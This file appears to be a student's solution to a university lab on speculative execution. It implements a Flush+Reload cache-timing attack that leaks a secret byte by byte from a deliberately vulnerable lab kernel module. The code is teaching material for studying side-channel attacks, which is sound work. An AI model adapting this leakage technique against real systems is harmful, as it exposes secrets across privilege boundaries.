/*
 * Lab 2 for MIT 6.888 Spring 2022
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "lab2.h"
#include "lab2ipc.h"

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    lab2_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab 2 vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[LAB2_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");
    printf("Shared memory: %p\n", shared_memory);

    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;
        char min_idx;
        size_t min_val = 1000000;

        // [6.888 Part 1]- Fill this in!
        // Feel free to create helper methods as necessary.
        // Use "call_kernel_part1" to interact with the kernel module
        // Find the value of leaked_byte for offset "current_offset"
        // leaked_byte = ??

        // printf("Train\n");
        // for (size_t i = 0; i < 128; i++) {
        //     call_kernel_part1(kernel_fd, shared_memory, 0);
        // }

        // printf("Flush\n");
        for (size_t j = 0; j < LAB2_SHARED_MEMORY_NUM_PAGES; j++) {
            clflush((void *)(shared_memory + (j * LAB2_PAGE_SIZE)));
        }

        // printf("Call\n");
        call_kernel_part1(kernel_fd, shared_memory, current_offset);

        // printf("Probe\n");
        for (size_t k = 0; k < LAB2_SHARED_MEMORY_NUM_PAGES; k++) {
            int access_time;

            access_time = time_access((void *)(shared_memory + (k * LAB2_PAGE_SIZE)));
            // printf("access_time[%d]: %d\n", i, access_time);

            if (access_time < min_val) {
                min_val = access_time;
                min_idx = k;
            }

            // if (access_time < 75) {
            //     leaked_byte = k;
            //     printf("leaked_byte: %c\n", leaked_byte);
            //     break;
            // }
        }

        printf("min_val: %d\n", min_val);

        leaked_byte = min_idx;
        printf("leaked_byte: %c\n", leaked_byte);

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Lab 2 Part 1] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
